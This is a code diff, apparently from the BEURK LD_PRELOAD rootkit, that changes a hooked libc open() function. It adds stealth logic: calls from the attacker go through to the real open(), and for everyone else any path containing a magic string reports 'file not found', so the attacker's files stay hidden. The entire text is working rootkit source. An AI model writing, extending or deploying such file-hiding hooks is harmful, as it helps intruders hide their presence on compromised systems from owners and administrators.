@@ -25,6 +25,8 @@
 #include <stdarg.h> /* va_list, va_start(), va_args(), va_end() */
 #include <fcntl.h> /* O_CREAT */
 #include <sys/stat.h> /* mode_t */
+#include <string.h> /* strstr() */
+#include <errno.h>
 #include "beurk.h"
 
 int open(const char *pathname, int flag, ...) {
@@ -36,7 +38,17 @@ int open(const char *pathname, int flag, ...) {
         va_start(args, flag);
         mode = (mode_t)va_arg(args, int);
         va_end(args);
+        if (is_attacker()) {
+            return REAL_OPEN(pathname, flag, mode);
+        }
+        if (strstr(pathname, MAGIC_STRING)) {
+            errno = ENOENT;
+            return (-1);
+        }
         return REAL_OPEN(pathname, flag, mode);
+    }
+    if (is_attacker()) {
+        return REAL_OPEN(pathname, flag);
     }
     return REAL_OPEN(pathname, flag);
 }
